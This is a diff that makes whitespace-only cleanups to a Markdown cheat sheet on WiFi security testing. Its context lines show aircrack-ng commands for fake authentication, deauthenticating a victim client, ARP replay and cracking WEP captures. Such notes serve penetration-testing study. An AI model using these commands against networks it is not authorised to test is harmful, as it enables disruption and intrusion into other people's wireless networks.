@@ -4,9 +4,8 @@
 
 * [aircrack-ng/aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) - WiFi security auditing tools suite
 * [kimocoder/wifite2](https://github.com/kimocoder/wifite2) - Rewrite of the popular wireless network auditor, "wifite" - original by @derv82
-* [derv82/wifite2](https://github.com/derv82/wifite2) - Rewrite of the popular wireless network auditor, "wifite" 
+* [derv82/wifite2](https://github.com/derv82/wifite2) - Rewrite of the popular wireless network auditor, "wifite"
 * [derv82/wifite](https://github.com/derv82/wifite) - Wifite is an automated wireless attack tool.
-
 
 ## Linux Wireless Basics
 
@@ -49,7 +48,6 @@ airmon-ng stop mon0
     * Manual 2: iwconfig wlan0 mode managed
 ```
 
-
 ## Aircrack-ng Essentials
 
 ```powershell
@@ -84,7 +82,6 @@ http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_
 Alfa AWUS036H / TPLink WN722
 ```
 
-
 ### Fake authentication attack
 
 :warning: use it before each attack
@@ -95,7 +92,7 @@ airodump-ng -c 3 --bssid $AP_MAC -w wep1 mon0
 # fake authentication = no arp
 aireplay-ng -1 0 -e AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0
     * Might need a real $ATTACKER_MAC, observe traffic using airodump
-	> Association successful! :-)
+ > Association successful! :-)
 
 # fake authentication for picky AP
 # Send keep-alive packets every 10 seconds
@@ -104,7 +101,6 @@ aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
 # might need to fake your MAC ADDRESS first
 ```
 
-
 ### Deauthentication attack
 
 > Force ARP packet to be sent.
@@ -112,9 +108,8 @@ aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
 ```powershell
 aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
     * -0 : 1 deauthentication, 0 unlimited
-	> Sending 64 directed DeAuth.
+ > Sending 64 directed DeAuth.
 ```
-
 
 ### ARP Replay Attack
 
@@ -122,8 +117,8 @@ Video: wifu-20.mp4 The attack listens for an ARP packet and then retransmits it 
 
 ```powershell
 aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0
-	* ATTACKER_MAC if fake authentication launched
-	* CONNECTED_MAC if a client is associated
+ * ATTACKER_MAC if fake authentication launched
+ * CONNECTED_MAC if a client is associated
 
 # –x 1000 –n 1000 ?
 # aireplay-ng -3 –x 1000 –n 1000 –b $AP_MAC -h $ATTACKER_MAC wlan0mon
@@ -134,7 +129,6 @@ aircrack-ng –b <BSSID> <PCAP_of_FileName>
 aircrack-ng -0 wep1.cap
     * -0 : colored output
 ```
-
 
 ## References
 
